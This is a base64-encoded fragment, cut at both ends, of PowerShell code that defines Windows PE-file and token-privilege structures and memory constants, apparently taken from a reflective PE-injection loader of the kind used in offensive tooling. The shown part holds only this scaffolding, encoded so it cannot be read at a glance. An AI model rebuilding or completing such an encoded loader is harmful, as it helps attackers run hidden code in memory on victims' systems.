cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFwQ29tbWl0JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZGVyRmxhZ3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlJ2YUFuZFNpemVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDkyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDk2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1wb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc291cmNlVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDExMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4Y2VwdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDZXJ0aWZpY2F0ZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlUmVsb2NhdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWJ1ZycsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTQ0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQXJjaGl0ZWN0dXJlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdHbG9iYWxQdHInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RMU1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2FkQ29uZmlnVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE3NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0JvdW5kSW1wb3J0JywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxODQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJQVQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE5MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RlbGF5SW1wb3J0RGVzY3JpcHRvcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjAwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ0xSUnVudGltZUhlYWRlcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjA4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUmVzZXJ2ZWQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIxNikgfCBPdXQtTnVsbAoJCSRJTUFHRV9PUFRJT05BTF9IRUFERVIzMiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX09QVElPTkFMX0hFQURFUjMyIC1WYWx1ZSAkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIKCgkJI1N0cnVjdCBJTUFHRV9OVF9IRUFERVJTNjQKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX05UX0hFQURFUlM2NCcsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDI2NCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpZ25hdHVyZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUhlYWRlcicsICRJTUFHRV9GSUxFX0hFQURFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ09wdGlvbmFsSGVhZGVyJywgJElNQUdFX09QVElPTkFMX0hFQURFUjY0LCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRJTUFHRV9OVF9IRUFERVJTNjQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTNjQgLVZhbHVlICRJTUFHRV9OVF9IRUFERVJTNjQKCQkKCQkjU3RydWN0IElNQUdFX05UX0hFQURFUlMzMgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfTlRfSEVBREVSUzMyJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjQ4KQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2lnbmF0dXJlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlSGVhZGVyJywgJElNQUdFX0ZJTEVfSEVBREVSLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnT3B0aW9uYWxIZWFkZXInLCAkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX05UX0hFQURFUlMzMiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMzMiAtVmFsdWUgJElNQUdFX05UX0hFQURFUlMzMgoKCQkjU3RydWN0IElNQUdFX0RPU19IRUFERVIKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0RPU19IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA2NCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWFnaWMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY2JscCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcmxjJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NwYXJoZHInLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWluYWxsb2MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWF4YWxsb2MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfc3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfc3AnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3N1bScsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9pcCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9sZmFybGMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb3ZubycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoKCQkkZV9yZXNGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9yZXMnLCBbVUludDE2W11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKQoJCSRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheQoJCSRGaWVsZEFycmF5ID0gQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKQoJCSRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gNCkpCgkJJGVfcmVzRmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQoKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb2VtaWQnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb2VtaW5mbycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoKCQkkZV9yZXMyRmllbGQgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfcmVzMicsIFtVSW50MTZbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpCgkJJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5CgkJJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSAxMCkpCgkJJGVfcmVzMkZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2xmYW5ldycsIFtJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX0RPU19IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRE9TX0hFQURFUiAtVmFsdWUgJElNQUdFX0RPU19IRUFERVIKCgkJI1N0cnVjdCBJTUFHRV9TRUNUSU9OX0hFQURFUgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfU0VDVElPTl9IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA0MCkKCgkJJG5hbWVGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTmFtZScsIFtDaGFyW11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKQoJCSRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheQoJCSRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gOCkpCgkJJG5hbWVGaWVsZC5TZXRDdXN0b21BdHRyaWJ1dGUoJEF0dHJpYkJ1aWxkZXIpCgoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbFNpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxBZGRyZXNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZSYXdEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9SYXdEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9SZWxvY2F0aW9ucycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvTGluZW51bWJlcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUmVsb2NhdGlvbnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mTGluZW51bWJlcnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRJTUFHRV9TRUNUSU9OX0hFQURFUiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NFQ1RJT05fSEVBREVSIC1WYWx1ZSAkSU1BR0VfU0VDVElPTl9IRUFERVIKCgkJI1N0cnVjdCBJTUFHRV9CQVNFX1JFTE9DQVRJT04KCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0JBU0VfUkVMT0NBVElPTicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsQWRkcmVzcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mQmxvY2snLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkSU1BR0VfQkFTRV9SRUxPQ0FUSU9OID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfQkFTRV9SRUxPQ0FUSU9OIC1WYWx1ZSAkSU1BR0VfQkFTRV9SRUxPQ0FUSU9OCgoJCSNTdHJ1Y3QgSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0lNUE9SVF9ERVNDUklQVE9SJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjApCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RpbWVEYXRlU3RhbXAnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZvcndhcmRlckNoYWluJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaXJzdFRodW5rJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX0lNUE9SVF9ERVNDUklQVE9SID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgLVZhbHVlICRJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUgoKCQkjU3RydWN0IElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0VYUE9SVF9ESVJFQ1RPUlknLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA0MCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vclZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ05hbWUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2UnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mRnVuY3Rpb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZk5hbWVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZGdW5jdGlvbnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZk5hbWVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZOYW1lT3JkaW5hbHMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkgLVZhbHVlICRJTUFHRV9FWFBPUlRfRElSRUNUT1JZCgkJCgkJI1N0cnVjdCBMVUlECgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdMVUlEJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvd1BhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0hpZ2hQYXJ0JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJExVSUQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMVUlEIC1WYWx1ZSAkTFVJRAoJCQoJCSNTdHJ1Y3QgTFVJRF9BTkRfQVRUUklCVVRFUwoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTFVJRF9BTkRfQVRUUklCVVRFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDEyKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTHVpZCcsICRMVUlELCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQXR0cmlidXRlcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRMVUlEX0FORF9BVFRSSUJVVEVTID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTFVJRF9BTkRfQVRUUklCVVRFUyAtVmFsdWUgJExVSURfQU5EX0FUVFJJQlVURVMKCQkKCQkjU3RydWN0IFRPS0VOX1BSSVZJTEVHRVMKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ1RPS0VOX1BSSVZJTEVHRVMnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAxNikKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ByaXZpbGVnZUNvdW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcml2aWxlZ2VzJywgJExVSURfQU5EX0FUVFJJQlVURVMsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFRPS0VOX1BSSVZJTEVHRVMgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBUT0tFTl9QUklWSUxFR0VTIC1WYWx1ZSAkVE9LRU5fUFJJVklMRUdFUwoKCQlyZXR1cm4gJFdpbjMyVHlwZXMKCX0KCglGdW5jdGlvbiBHZXQtV2luMzJDb25zdGFudHMKCXsKCQkkV2luMzJDb25zdGFudHMgPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKCQkKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fQ09NTUlUIC1WYWx1ZSAweDAwMDAxMDAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTUVNX1JFU0VSVkUgLVZhbHVlIDB4MDAwMDIwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX05PQUNDRVNTIC1WYWx1ZSAweDA